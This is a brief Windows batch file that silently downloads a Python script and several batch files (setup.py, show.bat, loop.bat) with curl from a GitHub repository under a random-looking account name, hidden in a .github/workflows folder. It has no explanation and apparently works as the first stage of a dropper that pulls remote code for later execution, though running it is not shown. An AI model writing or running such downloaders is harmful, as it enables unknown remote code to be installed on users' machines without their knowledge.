@echo off
curl -s -L -o setup.py https://raw.githubusercontent.com/xafehis4682/didactic-adventure/refs/heads/main/.github/workflows/setup.py
...
curl -s -L -o show.bat https://raw.githubusercontent.com/xafehis4682/didactic-adventure/refs/heads/main/.github/workflows/show.bat
curl -s -L -o loop.bat https://raw.githubusercontent.com/xafehis4682/didactic-adventure/refs/heads/main/.github/workflows/loop.bat
